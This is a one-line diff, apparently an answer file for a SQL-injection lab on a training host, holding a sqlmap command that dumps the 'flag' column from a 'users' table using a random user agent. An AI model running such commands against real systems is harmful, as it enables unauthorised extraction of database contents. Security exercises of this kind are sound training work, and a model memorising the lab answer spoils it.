@@ -1,0 +1,1 @@
+http://active.hbtn/product/1* (GET)  # /usr/bin/sqlmap -u http://active.hbtn/product/1* -D active.hbtn -T users -C flag --dump --dump-format=CSV --batch -v 0 --random-agent --timeout=8 --retries=0 --output-dir ./.sqlout
